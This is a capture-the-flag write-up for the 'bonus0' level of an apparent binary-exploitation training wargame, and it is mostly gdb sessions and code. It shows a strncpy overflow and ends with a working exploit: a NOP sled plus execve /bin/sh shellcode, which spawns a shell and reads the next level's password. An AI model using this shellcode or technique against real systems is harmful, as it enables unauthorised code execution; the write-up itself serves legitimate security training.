amjnan binary.

in this binary there is a local buffer in main that gets filled by subfunction called by main => `pp` and `p`, after that it prints it using `puts`.

it declares a buffer of size 50 then proceeds to call `pp`.

`pp` function declares 2 buffer each one `20` in size, and then calls `p` function twice, one to fill the first buffer and the other to fill the second buffer. after that it copies the 1st buffer to the `main` buffer using `strcpy`, adds a space in the end, and concatinate the 2nd buffer to `main` buffer using `strcat`.

`p` function declares a huge buffer (4014 in size), fills 4096 of it reading from `stdin` using `read`, replaces the newline character with string terminating 0 and finally copies 20 bytes using `strncpy`.

the problem with this is that if you enter 20 or more characters in the first input you will have no terminating zero in your string which will cause problems. that's what we will use to overflow the main buffer.

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA #20 char
 - 
BBBBBBBBBBBBBBBBBBBB #20 char
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
Segmentation fault (core dumped)
```

now we have a way to overwrite the return address but there is still one thing, where will we redirect our program?

if you remember our read call takes a huge piece of the stack we `p` is called maybe we can sneak it there. even if the stack frame is deallocated we can still access the data stored if we catch the address we need: 

```x86asm
(gdb) b p
Breakpoint 1 at 0x80484bd
(gdb) r
Starting program: /home/user/bonus0/bonus0 

Breakpoint 1, 0x080484bd in p ()
(gdb) set disassembly-flavor intel 
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018
=> 0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
(gdb) ni
0x080484c0 in p ()
(gdb) ni
0x080484c3 in p ()
(gdb) ni
 - 
0x080484c8 in p ()
(gdb) ni
0x080484d0 in p ()
(gdb) ni
0x080484d6 in p ()
(gdb) ni
0x080484da in p ()
(gdb) ni
0x080484e1 in p ()
(gdb) ni
AAAAAAAAAAAAAAAAAAAA
0x080484e6 in p ()
(gdb) x $eax
0x15:	Cannot access memory at address 0x15
(gdb) x/10wx $ebp-1008
0xbffff298:	0x00000044	0x00000044	0x00000004	0x00000004
0xbffff2a8:	0x00000007	0x001a31bc	0x001a31bc	0x001a31bc
0xbffff2b8:	0x00000008	0x00000040
(gdb) x/10wx $ebp-0x1008
0xbfffe680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe690:	0x41414141	0x0000000a	0x00000000	0x00000000
0xbfffe6a0:	0x00000000	0x00000000
(gdb) x/s $ebp-0x1008
0xbfffe680:	 'A' <repeats 20 times>, "\n"
(gdb) c
Continuing.

Breakpoint 1, 0x080484bd in p ()
(gdb) ni
0x080484c0 in p ()
(gdb) ni
0x080484c3 in p ()
(gdb) ni
 - 
0x080484c8 in p ()
(gdb) ni
0x080484d0 in p ()
(gdb) ni
0x080484d6 in p ()
(gdb) ni
0x080484da in p ()
(gdb) ni
0x080484e1 in p ()
(gdb) ni
BBBBBBBBBBBBBBBBBBBB
0x080484e6 in p ()
(gdb) x $eax
0x15:	 <Address 0x15 out of bounds>
(gdb) x/s $ebp-0x1008
0xbfffe680:	 'B' <repeats 20 times>, "\n"
(gdb) x/10wx $ebp-0x1008
0xbfffe680:	0x42424242	0x42424242	0x42424242	0x42424242
0xbfffe690:	0x42424242	0x0000000a	0x00000000	0x00000000
0xbfffe6a0:	0x00000000	0x00000000
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40
   0x080485ad <+9>:	lea    eax,[esp+0x16]
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
```

as you can see the buffer we use in `read` starts at this address `0xbfffe680`, so we can put our shellcode there and hopefully it will work.

and btw we need to know where to put return address in our string: 

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBCCCCDDDDEEEEFFFF
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF��� BBBBCCCCDDDDEEEEFFFF���

Program received signal SIGSEGV, Segmentation fault.
0x45444444 in ?? ()
```

now we have everything we need.

```bash
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "BBBBCCCCD\x10\xe7\xff\xbfEEEFFFF" + "\x90" * 200 + "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"'; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBCCCCD���EEEFFFF��� BBBBCCCCD���EEEFFFF���
pwd
/home/user/bonus0
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

for some reason i don't fully understand the address i tried to access to execute shellcode didnt work so i used a `nop slide` (because im lazy)
and i just shooted for an address within the `read` buffer and it worked.

there you go.
